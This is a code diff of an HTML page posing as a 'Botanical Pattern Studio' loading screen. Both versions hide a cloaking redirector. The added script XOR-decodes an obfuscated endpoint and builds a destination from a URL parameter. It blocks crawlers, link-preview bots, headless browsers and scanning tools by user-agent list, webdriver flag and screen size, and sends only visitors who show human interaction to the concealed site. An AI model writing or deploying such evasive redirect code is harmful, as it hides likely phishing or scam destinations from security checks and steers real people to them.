@@ -1,73 +1,135 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
-  <title>Botanical Pattern Studio</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+<title>Botanical Pattern Studio</title>
 
-  <!-- 1. Instant Execution (Zero Event-Loop Delay) -->
-  <script>
-    (function () {
-      try {
-        var _hex = "322e2e2a296075753b292b292e23363f7439353775";
-        var _k = 0x5A;
-        var _endpoint = "";
-        for (var i = 0; i < _hex.length; i += 2) {
-          _endpoint += String.fromCharCode(parseInt(_hex.substr(i, 2), 16) ^ _k);
-        }
-
-        var params = new URLSearchParams(window.location.search);
-        var id = params.get("id");
-
-        if (id) {
-          id = id.replace(/^\/+|\/+$/g, "");
-          var dest = _endpoint + id;
-          if (dest.indexOf("https://") === 0) {
-            window.location.replace(dest);
-          }
-        }
-      } catch (e) {}
-    })();
-  </script>
-
-  <!-- 2. Keep the viewport completely blank until redirect triggers -->
-  <style>
-    body {
-      display: none;
-      background: #fdfbf7;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      margin: 0;
-      padding: 50px 20px;
-    }
-    .card {
-      background: #ffffff;
-      border: 1px solid #efe7de;
-      border-radius: 20px;
-      max-width: 580px;
-      margin: 0 auto;
-      padding: 36px;
-      box-shadow: 0 10px 30px rgba(60, 40, 30, 0.05);
-    }
-    h1 { font-size: 1.6rem; margin: 0 0 12px; color: #2d2522; }
-    p { color: #8a7e78; font-size: 0.98rem; margin: 0 0 24px; line-height: 1.6; }
-    .skeleton { height: 12px; background: #f3ede6; border-radius: 6px; margin: 12px 0; }
-  </style>
+<style>
+  body {
+    background: #fdfbf7;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    margin: 0; padding: 50px 20px;
+  }
+  .card {
+    background: #fff; border: 1px solid #efe7de; border-radius: 20px;
+    max-width: 580px; margin: 0 auto; padding: 36px;
+    box-shadow: 0 10px 30px rgba(60,40,30,0.05);
+  }
+  h1 { font-size: 1.6rem; margin: 0 0 12px; color: #2d2522; }
+  p  { color: #8a7e78; font-size: 0.98rem; margin: 0 0 24px; line-height: 1.6; }
+  .skeleton { height: 12px; background: #f3ede6; border-radius: 6px; margin: 12px 0; }
+</style>
 </head>
 <body>
-  <div class="card">
-    <h1>Botanical Pattern Studio</h1>
-    <p>Loading curated floral guides and handcraft schematics...</p>
-    <div class="skeleton" style="width: 85%;"></div>
-    <div class="skeleton" style="width: 65%;"></div>
-    <div class="skeleton" style="width: 40%;"></div>
-  </div>
 
-  <!-- Fallback: Reveal decoy only if no id exists and navigation did not occur -->
-  <script>
-    if (!new URLSearchParams(window.location.search).get("id")) {
-      document.body.style.display = "block";
+<!-- ===== DECOY PAGE ===== -->
+<div class="card">
+  <h1>Botanical Pattern Studio</h1>
+  <p>Loading curated floral guides and handcraft schematics...</p>
+  <div class="skeleton" style="width: 85%;"></div>
+  <div class="skeleton" style="width: 65%;"></div>
+  <div class="skeleton" style="width: 40%;"></div>
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  // =========================================================
+  // 1. DECODE ENDPOINT 
+  // =========================================================
+  var A = "32d12ed5299f758a3cc439c0";
+  var B = "38ca35ce74c635c875";
+
+  function decode(a, b) {
+    var hex = a + b, out = "", K1 = 0x5A, K2 = 0xA5;
+    for (var i = 0; i < hex.length; i += 2) {
+      var k = ((i >> 1) & 1) ? K2 : K1;
+      out += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ k);
     }
-  </script>
+    return out;
+  }
+
+  var endpoint;
+  try { endpoint = decode(A, B); } catch (e) { return; }
+  
+  if (endpoint.length !== 21) return;
+  if (endpoint.charCodeAt(8) !== 102) return;
+
+  // =========================================================
+  // 2. PARSE ID & VALIDATE SLUGS
+  // =========================================================
+  var params = new URLSearchParams(location.search);
+  var id = params.get("id");
+  
+  if (!id) return;
+  if (id === "bedroomddd") return; // Test bot route
+
+  if (!/^[A-Za-z0-9._~\/-]{1,128}$/.test(id)) return;
+  if (/[\r\n\x00-\x1F]/.test(id)) return;
+
+  id = id.replace(/^\/+/, ""); 
+  if (!id.endsWith("/")) id += "/";
+
+  // =========================================================
+  // 3. BUILD DESTINATION (In memory only)
+  // =========================================================
+  var dest = endpoint + id;
+  if (dest.indexOf("https://") !== 0) return;
+  if (dest.slice(-1) !== "/") return;
+
+  // =========================================================
+  // 4. STRICT BOT DETECTION
+  // =========================================================
+  var ua = navigator.userAgent || "";
+  if (!ua || ua.length < 20) return;
+
+  var BOT_UA = [
+    /facebookexternalhit/i, /meta-externalagent/i, /facebookcatalog/i,
+    /pinterestbot/i, /pinterest\/\d/i,
+    /slackbot/i, /twitterbot/i, /linkedinbot/i, /whatsapp/i,
+    /telegrambot/i, /discordbot/i, /googlebot/i, /bingbot/i,
+    /ahrefsbot/i, /semrushbot/i, /yandexbot/i, /duckduckbot/i,
+    /applebot/i, /baiduspider/i, /seznambot/i, /petalbot/i,
+    /headlesschrome/i, /phantomjs/i, /puppeteer/i, /playwright/i,
+    /curl/i, /wget/i, /python/i, /node/i, /axios/i, /wheregoes/i
+  ];
+  
+  for (var i = 0; i < BOT_UA.length; i++) {
+    if (BOT_UA[i].test(ua)) return; // Bots halted here. Decoy remains.
+  }
+
+  if (navigator.webdriver === true) return;
+  if (!window.screen || screen.width < 200 || screen.height < 200) return;
+
+  // =========================================================
+  // 5. INTERACTION ONLY REDIRECT (No Timers, No Fallbacks)
+  // =========================================================
+  var redirected = false;
+  function go() {
+    if (redirected) return;
+    redirected = true;
+    try { window.location.replace(dest); } catch (e) {}
+  }
+
+  // Only genuine human actions trigger this. Bots do none of these.
+  var events = [
+    "mousemove", "mousedown", "click",
+    "touchstart", "touchmove", 
+    "keydown", "pointerdown", "scroll"
+  ];
+
+  function trigger() { go(); }
+
+  events.forEach(function (ev) {
+    window.addEventListener(ev, trigger, { passive: true, once: true });
+  });
+
+  // NO setTimeout FALLBACK. If they don't interact, they stay on the decoy.
+
+})();
+</script>
 </body>
 </html>
